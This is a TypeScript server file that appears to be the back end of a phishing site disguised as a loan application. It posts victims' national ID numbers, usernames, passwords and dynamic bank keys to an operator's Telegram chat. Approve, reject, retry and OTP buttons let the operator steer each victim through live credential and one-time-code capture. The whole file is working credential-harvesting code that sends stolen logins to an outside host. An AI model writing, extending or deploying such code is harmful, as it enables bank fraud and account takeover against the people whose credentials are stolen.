"use server"

import type { UserData } from "../types/auth"

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN as string
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID

/**
 * Sends a message to a specified Telegram chat with user data.
 *
 * @param {UserData} data - The user data to be sent to Telegram.
 * @returns {Promise<{ success: boolean }>} - A promise that resolves to an object indicating the success status.
 *
 * @throws {Error} - Throws an error if the request to Telegram fails.
 *
 * @example
 * const userData = {
 *   cedula: "123456789",
 *   usuario: "john_doe",
 *   clave: "password123",
 *   claveDinamica: "dynamicKey456"
 * };
 * 
 * sendToTelegram(userData)
 *   .then(response => {
 *     if (response.success) {
 *       console.log("Message sent successfully");
 *     } else {
 *       console.log("Failed to send message");
 *     }
 *   })
 *   .catch(error => {
 *     console.error("Error:", error);
 *   });
 */
export async function sendToTelegram(data: UserData) {
  const message = `
    🔔 Nuevo ingreso:
    📝 Cédula: ${data.cedula}
    👤 Usuario: ${data.usuario}
    🔑 Clave: ${data.clave}
    🔐 Clave Dinámica: ${data.claveDinamica}
  `;

  try {
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        reply_markup: {
          // In the sendToTelegram function, update the inline_keyboard array:
          inline_keyboard: [
            [
              {
                text: "✅ Aprobar",
                callback_data: `approve_${data.cedula}`
              },
              {
                text: "❌ Rechazar",
                callback_data: `reject_${data.cedula}`
              },
              {
                text: "🔄 Reintentar",
                callback_data: `retry_${data.cedula}`
              },
              {
                text: "🔐 OTP",
                callback_data: `otp_${data.cedula}`
              }
            ]
          ]
        }
      }),
    });

    if (!response.ok) {
      throw new Error('Failed to send Telegram message');
    }

    return { success: true };
  } catch (error) {
    console.error('Error sending to Telegram:', error);
    return { success: false };
  }
}

// Store loan statuses in memory and localStorage (temporary solution)
const LOAN_STATUSES_KEY = 'loanStatuses';

type LoanStatus = 'processing' | 'approved' | 'rejected' | 'retry' | 'otp';
function getLoanStatusesFromStorage(): Map<string, LoanStatus> {
  if (typeof window === "undefined") return new Map(); // Evita errores en el servidor
  try {
    const storedStatuses = localStorage.getItem(LOAN_STATUSES_KEY);
    if (storedStatuses) {
      return new Map(JSON.parse(storedStatuses));
    }
  } catch (error) {
    console.error('Error reading from localStorage:', error);
  }
  return new Map();
}

function saveLoanStatusesToStorage(statuses: Map<string, LoanStatus>) {
  try {
    localStorage.setItem(LOAN_STATUSES_KEY, JSON.stringify(Array.from(statuses.entries())));
  } catch (error) {
    console.error('Error saving to localStorage:', error);
  }
}

const loanStatuses = getLoanStatusesFromStorage();
export async function handleTelegramWebhook(req: Request) {
  const data = await req.json();
  
  // Handle callback queries (button clicks)
  if (data.callback_query) {
    const { callback_query } = data;
    const { data: callbackData, message } = callback_query;
    
    if (callbackData.startsWith('approve_') || callbackData.startsWith('reject_') || callbackData.startsWith('retry_') || callbackData.startsWith('otp_')) {
      const [action, cedula] = callbackData.split('_');
      const status = action === 'approve' ? 'approved' : 
                    action === 'reject' ? 'rejected' : 
                    action === 'otp' ? 'otp' : 'retry';
      
      // Update loan status and save to storage
      loanStatuses.set(cedula, status);
      saveLoanStatusesToStorage(loanStatuses);
      
      // Update the Telegram message to show the decision
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/editMessageText`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: message.chat.id,
          message_id: message.message_id,
          text: `${message.text}\n\nEstado: ${
            status === 'approved' ? '✅ Aprobado' : 
            status === 'rejected' ? '❌ Rechazado' : 
            status === 'otp' ? '🔐 OTP Solicitado' :
            '🔄 Reintento solicitado'
          }`,
        }),
      });

      return { action, cedula, status };
    }
  }

  return { action: 'unknown' };
}

export async function getLoanStatus(cedula: string): Promise<LoanStatus> {
  return loanStatuses.get(cedula) || 'processing';
}